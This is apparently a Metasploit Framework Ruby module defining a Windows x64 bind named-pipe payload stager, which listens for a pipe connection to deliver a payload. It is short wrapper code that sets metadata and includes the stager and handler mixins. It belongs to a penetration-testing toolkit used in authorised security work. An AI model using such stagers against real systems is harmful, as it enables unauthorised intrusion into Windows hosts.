##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_named_pipe'
require 'msf/core/payload/windows/x64/bind_named_pipe'

module MetasploitModule

  CachedSize = 481

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindNamedPipe_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Bind Named Pipe Stager',
      'Description'   => 'Listen for a pipe connection (Windows x64)',
      'Author'        => [ 'UserExistsError' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindNamedPipe,
      'Convention'    => 'sockrdi', # hPipe
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end
end
